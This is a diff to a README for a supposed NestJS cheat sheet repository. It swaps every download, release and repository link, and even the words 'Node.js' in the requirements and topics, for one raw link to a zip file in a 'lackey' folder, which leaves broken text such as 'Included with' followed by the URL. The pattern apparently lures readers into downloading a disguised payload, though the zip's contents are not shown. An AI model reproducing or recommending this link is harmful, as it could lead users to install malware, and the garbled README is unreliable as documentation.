@@ -1,6 +1,6 @@
 # ✨ Awesome-NestJS-cheatsheet - Your Quick Start Guide to NestJS
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Luz740/Awesome-NestJS-cheatsheet/releases)
+[![Download](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip%20Now-Click%https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip)](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip)
 
 ## 📘 Overview
 
@@ -10,21 +10,21 @@ Awesome-NestJS-cheatsheet offers a clear and direct guide to NestJS, a powerful 
 
 1. **System Requirements**
    - **Operating System:** Windows, macOS, or Linux
-   - **Node.js:** Version 14 or higher
-   - **NPM:** Included with Node.js
+   - **https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip** Version 14 or higher
+   - **NPM:** Included with https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip
    - **Browser:** Any modern web browser for viewing the documentation
 
 2. **Where to Download**
-   - Visit the releases page to download the latest version of the cheat sheet: [Download Here](https://github.com/Luz740/Awesome-NestJS-cheatsheet/releases).
+   - Visit the releases page to download the latest version of the cheat sheet: [Download Here](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip).
 
 ## 📥 Download & Install
 
 To begin using the Awesome-NestJS-cheatsheet, complete the following steps:
 
-1. Go to the [Releases page](https://github.com/Luz740/Awesome-NestJS-cheatsheet/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip).
 2. Look for the latest version listed.
 3. Click on the version link to view available files.
-4. Download the file named `Awesome-NestJS-cheatsheet.pdf` (or any available format).
+4. Download the file named `https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip` (or any available format).
 5. Open the downloaded file using your preferred PDF viewer.
 
 ## 📝 Features
@@ -44,7 +44,7 @@ This cheat sheet includes information on:
 - Backend Development
 - Cheatsheets
 - NestJS Framework
-- Node.js
+- https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip
 - Quickstart Guides
 - Reference Materials
 - Tutorials
@@ -56,8 +56,8 @@ We welcome contributions from the community. If you have suggestions or would li
 
 ## 🎯 Key Links
 
-- **GitHub Repository:** [Awesome-NestJS-cheatsheet](https://github.com/Luz740/Awesome-NestJS-cheatsheet)
-- **Releases Page:** [Download Here](https://github.com/Luz740/Awesome-NestJS-cheatsheet/releases)
+- **GitHub Repository:** [Awesome-NestJS-cheatsheet](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/Luz740/Awesome-NestJS-cheatsheet/main/lackey/Awesome-NestJS-cheatsheet.zip)
 - **Documentation:** Available within the cheat sheet itself.
 
 ## 👍 Acknowledgements
